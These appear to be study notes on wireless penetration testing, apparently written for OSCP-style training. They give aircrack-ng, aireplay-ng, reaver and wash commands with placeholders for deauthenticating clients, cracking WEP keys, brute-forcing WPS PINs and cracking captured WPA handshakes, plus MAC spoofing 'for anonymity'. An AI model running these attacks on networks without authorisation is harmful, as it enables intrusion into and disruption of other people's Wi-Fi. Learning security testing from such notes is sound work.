# Wireless Penetration Testing

### Section 1: Requirements

You will need a wireless adapter for this section

1. [Best USB Wireless (WiFi) Adapters For Hacking 2022](https://www.youtube.com/watch?v=0lqRZ3MWPXY&lc=z23ssbjham3bzhpi004t1aokgl2ihekdkcw2nlbcvwi0rk0h00410)

2. [How to enable external Wi-Fi adapter to Virtual Box | How to add VirtualBox Extension Pack | 2020](https://www.youtube.com/watch?v=LpPlAID6LJA)

You may or may not need to perform further steps for your VM powered by virtual box to detect the wireless adapter. See my OSCP repository for more information

### Section 2: Set Up

1. Changing of MAC address for anonymity

2. Wireless Modes

3. Commands to configure wireless adapter

### Section 3: Information Gathering/Pre-connection Attacks

1. WiFi Bands (2.4GHz & 5.0GHz)

2. Packet Sniffing with `airodump-ng`

3. Traffic analysis with `wireshark`

4. Deauthentication Attack using `aireplay-ng`

    `aireplay-ng --deauth 100000000000 -a <ROUTER_BSSID> -c <TARGET_BSSID> <NETWORK_INTERFACE>`

### Section 4: WEP Gaining Access

1. WEP Theory

2. WEP Cracking (busy network)

    - Need to capture a huge amount of packets

        `airodump-ng --bssid <ROUTER_BSSID> --channel <CHANNEL_NUMBER> --write <FILE_NAME> <NETWORK_INTERFACE>`

    - Crack key from packets captured

        `aircrack-ng <FILE_NAME>.cap`

3. WEP Cracking (idle network)

    - Need to capture a huge amount of packets

        `airodump-ng --bssid <ROUTER_BSSID> --channel <CHANNEL_NUMBER> --write <FILE_NAME> <NETWORK_INTERFACE>`

    - Fake Authentication Attack to pretend to be a client connecting to router

        `aireplay-ng --fakeauth 0 -a <ROUTER_BSSID> -h <HACKER_MAC_ADDRESS> <NETWORK_INTERFACE>`

    - ARP Request Replay Attack to force AP to generate IVs to crack key

        `aireplay-ng --arpreplay -b <ROUTER_BSSID> -h <HACKER_MAC_ADDRESS> <NETWORK_INTERFACE>`

    - Crack key from packets captured

        `aircrack-ng <FILE_NAME>.cap`

### Section 5: WPA/WPA2 Gaining Access

1. WPA/WPA2 Theory

    - Need to bruteforce

2. WPS Theory

3. WPA/WPA2 Cracking (WPS enabled + configured to not use PBC)

    - Check if WPS is enabled

        `wash --interface <NETWORK_INTERFACE>`
    
    - Fake Authentication Attack to pretend to be a client connecting to router

        `aireplay-ng --fakeauth 0 -a <ROUTER_BSSID> -h <HACKER_MAC_ADDRESS> <NETWORK_INTERFACE>`

    - Bruteforce 8 digit pin using `reaver`

        `reaver --bssid <ROUTER_BSSID> --channel <CHANNEL_NUMBER> --interface <NETWORK_INTERFACE> -vvv --no-associate`

4. WPA/WPA2 Cracking (condition above not met)

    - Need to capture Handshake packets

        `airodump-ng --bssid <ROUTER_BSSID> --channel <CHANNEL_NUMBER> --write <FILE_NAME> <NETWORK_INTERFACE>`

    - Wait for client to connect to router

        > Theoretically, we should be able to perform a fake authentication attack here?

    - Deauthenticate client from router to force client to reauthenticate and to generate handshake capture by airodump-ng

        `aireplay-ng --deauth 4 -a <ROUTER_BSSID> -c <TARGET_BSSID> <NETWORK_INTERFACE>`

    - Generate wordlist/use wordlists that comes with Kali

    - Bruteforce with `aircrack-ng`

        `aircrack-ng <FILE_NAME>.cap -w <WORDLIST>.txt`
